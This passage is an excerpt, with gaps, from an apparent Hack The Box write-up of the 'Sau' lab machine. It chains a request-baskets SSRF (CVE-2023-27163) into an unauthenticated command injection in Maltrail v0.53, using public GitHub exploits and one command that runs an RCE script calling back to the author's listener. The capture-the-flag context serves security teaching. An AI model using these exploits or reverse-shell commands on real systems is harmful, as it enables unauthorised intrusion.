[HTB: Sau](/2024/01/06/htb-sau.html)

![Sau](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/sau-cover.webp)
...
[![Sau](/icons/box-sau.webp)](https://hackthebox.com/machines/sau)

[Sau](https://hackthebox.com/machines/sau)
...
Rated Difficulty ![Rated difficulty for Sau](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/sau-diff.webp)

Radar Graph ![Radar chart for Sau](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/sau-radar.webp)

User

00:08:39 Root

00:11:40 Creator ## Recon
...
![image-20240104103208546](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20240104103208546.webp)

On clicking create, it returns a token that can be used to access the basket in the future:

![image-20240104103240757](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20240104103240757.webp)

Opening the basket, it shows how to populate it:

![image-20240104103322121](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20240104103322121.webp)

If I run `curl http://10.10.11.224:55555/h5lgafg`, it shows up in the basket:

![image-20240104103412905](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20240104103412905.webp)
...
![image-20240104104117044](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20240104104117044.webp)

#### Exploit

There’s a nice POC [on GitHub](https://github.com/entr0pie/CVE-2023-27163/blob/main/CVE-2023-27163.sh) to exploit this. I’ll run it to try to read port 80:
...
![image-20240104104623782](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20240104104623782.webp)

The CSS and images aren’t loading, but I can at least see it’s Maltrail v0.53.
...
Searching for “Maltrail exploit”, the first hit is [this repo](https://github.com/spookier/Maltrail-v0.53-Exploit) which has an unauthenticated code execution vulnerability in Maltrail v0.53. The login page doesn’t sanitize the input for the username parameter, which leads to OS command injection.
...
```
oxdf@hacky$ python maltrail_rce.py 10.10.14.6 443 http://10.10.11.224:55555/jgulua
...
![image-20240104110236282](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20240104110236282.webp)
